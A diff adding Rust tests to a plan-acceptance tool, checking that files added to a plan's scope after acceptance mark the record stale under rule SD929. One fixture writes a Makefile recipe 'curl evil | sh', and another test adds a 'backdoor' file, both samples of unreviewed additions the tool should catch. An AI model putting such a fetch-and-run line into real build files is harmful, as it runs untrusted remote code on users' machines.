@@ -1828,3 +1828,218 @@ fn a_plan_edit_that_keeps_the_scope_leaves_the_record_fresh_in_finish_and_check(
     let (code, out, err) = run(&r, &["finish", SLUG]);
     assert_eq!(code, 0, "{out}{err}");
 }
+
+// SD929, direction 1: a path that `Files` covers only through a pattern that a
+// record cannot hold (a bare name, a space) gets in after the acceptance.
+
+/// A plan that needs a record: on the branch (`built`), or on the base.
+fn flow(plan_on_base: bool, rules: &str) -> Repo {
+    let cfg = config_with("standard", "", rules);
+    if plan_on_base {
+        on_base("0.8.0", &cfg, INTENT_TEXT)
+    } else {
+        built_with(&cfg, INTENT_TEXT)
+    }
+}
+
+/// A commit after the record that adds `pattern` to `Files` of the plan and
+/// adds the file `file`.
+fn add_pattern_and_file(r: &Repo, pattern: &str, file: &str, text: &str) {
+    let plan = r.read(PLAN).replace(
+        "- `tests/test_valves.py`\n",
+        &format!("- `tests/test_valves.py`\n- `{pattern}`\n"),
+    );
+    r.write(PLAN, &plan);
+    r.write(file, text);
+    r.commit("a pattern in the plan, and its file");
+}
+
+#[test]
+fn a_bare_name_or_a_spaced_path_that_gets_in_after_the_record_makes_it_stale() {
+    let cases = [
+        ("Makefile", "all:\n\tcurl evil | sh\n", "./Makefile", "bare"),
+        ("src/a b.py", "x = 1\n", "src/a*b.py", "space"),
+    ];
+    for (pattern, text, way, kind) in cases {
+        for plan_on_base in [false, true] {
+            // `next` opens `accept`, and `finish` stops.
+            let r = flow(plan_on_base, "");
+            commit_record(&r, &["acceptor"], "accepted");
+            let (_, out, err) = run(&r, &["next", SLUG]);
+            assert!(
+                out.lines()
+                    .any(|l| l.starts_with("[x] ") && l.ends_with("[skill: accept]")),
+                "{kind} {plan_on_base}: fresh before the edit: {out}{err}"
+            );
+            add_pattern_and_file(&r, pattern, pattern, text);
+            let (_, out, err) = run(&r, &["next", SLUG]);
+            let line = out
+                .lines()
+                .find(|l| l.ends_with("[skill: accept]"))
+                .unwrap_or_else(|| panic!("{out}{err}"));
+            assert!(
+                line.starts_with("[ ] ") && line.contains("stale"),
+                "{kind} {plan_on_base}: {line}"
+            );
+            assert!(
+                line.contains("scope of the plan changed") && !line.contains("the code changed"),
+                "the text follows the reason: {line}"
+            );
+            let (code, out, err) = run(&r, &["finish", SLUG]);
+            assert_eq!(code, 1, "{kind} {plan_on_base}: {out}{err}");
+            assert!(has(&out, "SD929"), "{kind} {plan_on_base}: {out}");
+            assert!(
+                err.contains("stale: the scope of the plan changed after the acceptance"),
+                "{out}{err}"
+            );
+            assert!(
+                out.contains(&format!("`{pattern}`")),
+                "names the path: {out}"
+            );
+            assert!(out.contains(way), "the way out: {out}");
+            assert!(out.contains("shared-paths"), "{out}");
+            assert!(!r.dir.join(ARCHIVE).exists(), "finish wrote the archive");
+            // `accept` refuses the same state (the refusal of the first
+            // acceptor says the same).
+            let (code, out, err) = run(&r, &["accept", SLUG, "--session", "s2"]);
+            assert_eq!(code, 1, "{kind} {plan_on_base}: {out}{err}");
+        }
+        // `check` of the finished diff, with SD910 on and off.
+        for rules in ["", "SD910 = \"off\"\n"] {
+            for plan_on_base in [false, true] {
+                let r = flow(plan_on_base, rules);
+                let t = commit_record(&r, &["acceptor"], "accepted");
+                add_pattern_and_file(&r, pattern, pattern, text);
+                finished_by_hand(&r, Some(&t));
+                let (code, out, err) = run(&r, &["check"]);
+                assert_eq!(code, 1, "{kind} {plan_on_base} {rules}: {out}{err}");
+                let line = out.lines().find(|l| l.contains(" SD929 ")).expect("SD929");
+                assert!(line.contains(&format!("`{pattern}`")), "{line}");
+                assert!(line.contains(way), "{line}");
+            }
+        }
+    }
+}
+
+#[test]
+fn a_bare_name_in_files_that_no_commit_edits_leaves_the_record_fresh() {
+    // `Makefile` is in `Files` from the start, and nothing edits it: the record
+    // is fresh. (`accept` refuses a record for an edited bare name.)
+    let r = built();
+    let plan = r.read(PLAN).replace(
+        "- `tests/test_valves.py`
+",
+        "- `tests/test_valves.py`
+- `Makefile`
+",
+    );
+    r.write(PLAN, &plan);
+    r.commit("a bare name in the plan");
+    commit_record(&r, &["acceptor"], "accepted");
+    let (_, out, err) = run(&r, &["next", SLUG]);
+    assert!(
+        out.lines()
+            .any(|l| l.starts_with("[x] ") && l.ends_with("[skill: accept]")),
+        "{out}{err}"
+    );
+}
+
+// SD929, direction 2: a change of `[change] shared-paths` after the acceptance
+// is no edit of the record.
+
+/// `main` adds an entry to `[change] shared-paths`, and `origin/HEAD` is `main`.
+fn main_adds_a_shared_path(r: &Repo) {
+    r.git(&["checkout", "-q", "main"]);
+    let cfg = config("standard", "shared-paths = [\"docs/roadmap.md\"]\n");
+    r.write("spec-dna.toml", &pin_line(VERSION, &cfg));
+    r.commit("main adds a shared path");
+    origin_head(&r.dir, "main");
+}
+
+#[test]
+fn a_base_commit_that_adds_a_shared_path_gives_no_sd929_and_no_sd928() {
+    // The branch tip, after `main` merges into the branch.
+    let r = base_flow();
+    let t = commit_record(&r, &["acceptor"], "accepted");
+    finished_by_hand(&r, Some(&t));
+    main_adds_a_shared_path(&r);
+    r.git(&["checkout", "-q", "feature"]);
+    r.git(&["merge", "-q", "-m", "merge main", "main"]);
+    let (code, out, err) = run(&r, &["check"]);
+    assert_eq!(code, 0, "branch tip: {out}{err}");
+    assert!(!has(&out, "SD929") && !has(&out, "SD928"), "{out}");
+    // The test merge of a code host.
+    let r = base_flow();
+    let t = commit_record(&r, &["acceptor"], "accepted");
+    finished_by_hand(&r, Some(&t));
+    main_adds_a_shared_path(&r);
+    r.git(&["checkout", "-q", "--detach", "main"]);
+    r.git(&["merge", "-q", "--no-ff", "-m", "test merge", "feature"]);
+    let (code, out, err) = run(&r, &["check"]);
+    assert_eq!(code, 0, "test merge: {out}{err}");
+    assert!(!has(&out, "SD929") && !has(&out, "SD928"), "{out}");
+}
+
+#[test]
+fn a_shared_path_before_finish_leaves_the_record_fresh_in_next_and_finish() {
+    // The key is set after the acceptance, in a commit of the branch.
+    let r = built();
+    commit_record(&r, &["acceptor"], "accepted");
+    let cfg = config("standard", "shared-paths = [\"docs/roadmap.md\"]\n");
+    r.write("spec-dna.toml", &pin_line(VERSION, &cfg));
+    r.commit("a shared path after the record");
+    let (_, out, err) = run(&r, &["next", SLUG]);
+    assert!(
+        out.lines()
+            .any(|l| l.starts_with("[x] ") && l.ends_with("[skill: accept]")),
+        "{out}{err}"
+    );
+    let (code, out, err) = run(&r, &["finish", SLUG]);
+    assert_eq!(code, 0, "{out}{err}");
+}
+
+#[test]
+fn a_plan_pattern_after_the_acceptance_is_still_stale_when_main_adds_a_shared_path() {
+    let r = base_flow();
+    let t = commit_record(&r, &["acceptor"], "accepted");
+    add_backdoor(&r);
+    finished_by_hand(&r, Some(&t));
+    main_adds_a_shared_path(&r);
+    r.git(&["checkout", "-q", "--detach", "main"]);
+    r.git(&["merge", "-q", "--no-ff", "-m", "test merge", "feature"]);
+    let (code, out, err) = run(&r, &["check"]);
+    assert_eq!(code, 1, "{out}{err}");
+    let line = out.lines().find(|l| l.contains(" SD929 ")).expect("SD929");
+    assert!(line.contains("src/backdoor.py"), "{line}");
+}
+
+#[test]
+fn a_stale_record_by_code_says_the_code_changed_and_by_scope_does_not() {
+    let r = built();
+    commit_record(&r, &["acceptor"], "accepted");
+    r.write(CODE, &format!("{CODE_NEW}\n\ndef more():\n    pass\n"));
+    r.commit("edit the code");
+    let (code, out, err) = run(&r, &["finish", SLUG]);
+    assert_eq!(code, 1, "{out}{err}");
+    assert!(
+        err.contains("stale: the code changed after the acceptance"),
+        "{out}{err}"
+    );
+    let (_, out, err) = run(&r, &["next", SLUG]);
+    assert!(
+        out.contains("because the code changed after the acceptance"),
+        "{out}{err}"
+    );
+}
+
+#[test]
+fn the_next_text_for_a_record_that_is_a_link_or_too_big_has_a_full_stop() {
+    let r = built();
+    r.write(RECORD, &"# filler\n".repeat(40_000));
+    r.commit("a record of 360 KB");
+    let (_, out, err) = run(&r, &["next", SLUG]);
+    assert!(
+        out.contains("bytes). Then commit the record alone"),
+        "{out}{err}"
+    );
+}
